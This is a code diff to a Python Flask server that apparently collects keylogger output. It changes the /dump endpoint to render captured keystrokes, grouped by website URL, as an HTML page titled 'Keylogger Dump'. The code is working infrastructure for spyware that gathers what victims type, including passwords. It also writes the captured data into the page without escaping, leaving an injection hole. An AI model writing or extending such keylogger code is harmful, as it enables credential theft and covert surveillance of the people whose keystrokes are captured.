@@ -42,10 +42,25 @@ def recieve_log():
 # }
 @APP.route("/dump", methods=["GET"])
 def dump_log():
+    dump = """
+    <html>
+        <head>
+            <title>Keylogger Dump</title>
+        </head>
+        <body>
+    """
     with open("log.json") as logfile:
         log = json.load(logfile)
-        return json.dumps(log)
-    
+        for url in log.keys():
+            dump += """
+            <h1>{0}</h1>
+            {1}
+            """.format(url, log[url])
+    dump += """
+        </body>
+    </html>
+    """
+    return dump
 
 if __name__ == "__main__":
     APP.run(debug=False, port=5000)
